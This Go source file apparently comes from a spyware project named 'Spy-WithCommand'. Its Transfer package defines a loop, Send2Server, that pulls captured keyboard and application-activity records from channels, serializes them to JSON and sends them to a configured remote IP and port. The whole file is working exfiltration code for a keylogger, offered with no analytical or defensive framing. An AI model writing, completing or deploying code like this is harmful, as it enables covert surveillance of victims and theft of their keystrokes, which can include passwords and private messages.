package Transfer

import (
	"encoding/json"
	"github.com/mhthrh/Spy-WithCommand/Application"
	"github.com/mhthrh/Spy-WithCommand/KeyBoard"
	"github.com/mhthrh/Spy-WithCommand/Utils/NetUtil"
)

type Transfer struct {
	Ip   string
	Port int64
	CA   *chan Application.Application
	CK   *chan KeyBoard.KeyBoard
}

func Send2Server(t *Transfer, _ch *chan bool) {
	var Continue = false
	for {
		select {
		case Continue, _ = <-*_ch:
		default:
			Continue = true
		}
		if !Continue {
			return
		}
		select {
		case data := <-*t.CA:
			d, _ := json.Marshal(&data)
			NetUtil.Send(t.Ip, t.Port, string(d))
		case data := <-*t.CK:
			d, _ := json.Marshal(&data)
			NetUtil.Send(t.Ip, t.Port, string(d))
		}

	}
}
